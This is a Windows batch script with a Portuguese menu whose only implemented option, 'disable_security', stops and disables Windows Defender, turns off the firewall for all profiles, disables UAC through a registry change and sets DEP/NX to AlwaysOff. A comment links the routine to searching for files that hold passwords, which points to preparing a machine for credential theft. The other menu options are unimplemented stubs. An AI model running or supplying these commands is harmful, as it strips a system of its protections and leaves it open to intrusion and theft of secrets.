@echo off

@REM Inicio do MENU
:menu
cls
echo.
echo 1. disable_security
echo 2. Naoimplementado
echo 3. Naoimplementado
echo 4. Sair
echo.
set /p choice=Escolha uma opcao (1-4): 
echo %choice%
if "%choice%"=="1" (
    call :disable_security
) else if "%choice%"=="2" (
    call :Naoimplementado
) else if "%choice%"=="3" (
    call :Naoimplementado
) else if "%choice%"=="4" (
    goto :eof
) else (
    echo Opcao invalida. Tente novamente.
    pause
    goto menu
)
goto menu

@REM Define a função
:disable_security
    echo "* Desabilita segurança"
    REM auxiliam na hora de procurar porarquivos que contenham senhas.
    echo "|-> Desativando windows defender"
    sc stop WinDefend
    sc config WinDefend start= disabled
    echo "|-> Desativando firewall"
    netsh advfirewall set allprofiles state off
    echo "|-> Desativando UAC"
    reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v EnableLUA /t REG_DWORD /d 0 /f
    echo "|-> Desativando NX"
    bcdedit.exe /set {current} nx AlwaysOff
    pause
goto menu

exit /b